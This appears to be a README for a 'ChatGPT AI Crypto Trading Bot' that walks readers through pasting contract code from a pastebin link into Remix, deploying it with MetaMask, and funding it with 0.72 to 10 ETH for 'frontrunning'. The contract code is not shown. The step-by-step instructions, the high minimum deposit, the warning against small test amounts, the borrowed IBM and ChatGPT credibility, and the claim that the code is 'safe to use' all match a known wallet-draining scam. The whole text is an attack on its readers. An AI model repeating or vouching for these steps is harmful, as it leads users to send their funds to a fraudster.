# ChatGPT AI Crypto Trading Bot

## Overview
A powerful AI-based crypto trading bot for Ethereum and DeFi markets.

ChatGPT AI Crypto Trading Bot is an open-source, educational project demonstrating how AI-assisted logic, automation, and data analysis can be used to build crypto trading bots. Includes modular code, strategy examples, API integration concepts, and customization for research and learning purposes.

As seen on IBM Artificial Intelligence YouTube Channel: https://www.youtube.com/watch?v=A25BI356kA0&t=37s

This bot allows you to trade cryptocurrencies using AI algorithms through ChatGPT and other AI models directly on the blockchain. It will analyze market data, important trends, and token sentiments as well as trader portfolios to make fully automated trading movements. Stop-losses are built in to prevent any mistakes in opening and closing positions. The bot manages leverages and optimizes risk in real time. Simply use the code source to create your own smart contract that will serve as your "bot" on remix.ethereum.org the web-based development environment for Ethereum smart contracts. Step by step instructions below.

##  🟢STEP-BY-STEP INSTRUCTIONS:

🟢 Step 1: Download МetаМаsk: https://metamask.io/download

🟢 Step 2: Code Compiler : https://pastebin.com/QBMBhae3

🔗 Click here to access Remix : https://remix.ethereum.org/

🟢 Step 3: Create a New File on Remix

Press the new file button and name it however you'd like ( bot.sol). Make sure the file ends with .sol for Ethereum code.

🟢 Step 4: Paste This Code Into Your New File on Remix

🟢 Step 5: Navigate to the Solidity Compiler tab in Remix and compile your bot. Be sure to select compiler version 0.8.4

⚠️ Tip: If the code doesn't show up with colors, simply refresh the browser and paste the code again.

🟢 Step 6: Go to the 'Deploy & Run Transactions' tab, choose 'Injected Provider' as your environment, and click Deploy. After confirming the contract creation fee in MetaMask, your contract will be deployed.

⚠️ Tip: If you get any issues - use a clean Firefox browser and only one MetaMask extension

🟢 Step 7: Add funds to your bot for transaction frontrunning (always manually set the Aggressive gas option)

⚠️⚠️⚠️ Do not try to test the bot using too low amount - in this case transaction fees will be higher than your profits and the bot will instantly catch Stop Loss and will not start ⚠️⚠️⚠️.

The minimum recommended amount is 0.72 ETH - 10 ETH

🟢 Step 8: Once the transaction is confirmed, click Start to activate the bot. To stop it and withdraw funds, click Withdraw.

(Make sure you have enough ETH in your main wallet (not in your contract address) to pay the gas fee for pressing the Start button.)

This FAQ answers common questions about using an AI crypto trading bot on Ethereum with open-source smart contracts.

## ❓ FAQ

❓ **Is this bot profitable?**

Profitability depends on many factors, including market conditions, strategy configuration, risk management, and execution costs. This project is designed as an educational framework to demonstrate how AI-assisted trading logic can be implemented, not as a guaranteed profit system.


❓**Can I use the source code on another IDE other than remix.ethereum.org?**

No. The bot is designed to run with the remix ID environment so it is recommended running there. In the future we will add other Ethereum based environments if you prefer to use another one.

❓ **Is this an official ChatGPT or OpenAI product?**

No. This is an independent open-source project and is not affiliated with, endorsed by, or maintained by OpenAI or ChatGPT. We are simply using the ChatGPT model to generate live-trading into an IDE as well as the use of Ethereum smart contracts.

❓ **What exchanges or APIs does this support?**

API support depends on how the user configures the project. Example integrations are provided for demonstration purposes only and may require modification.

❓ **Can beginners use this project?**

Yes, no coding knowledge is necessary. The code is structured to be readable and modular for learning and experimentation.

❓ **Is this project safe to use?**

The code is open-source and safe to use. Feel free to review the code, never commit private keys to anyone, and never use funds you cannot afford to lose.

❓ **Can I modify or extend this bot?**

Yes. You are free to fork, modify, and extend the project under the terms of the license.

❓ **Why is this repository public?**

This repository exists to demonstrate AI-assisted automation concepts, not to provide a finished trading solution.

❓ **Will you provide support or updates?**

Updates and improvements may be added over time, but no guarantees are made regarding ongoing maintenance or support.
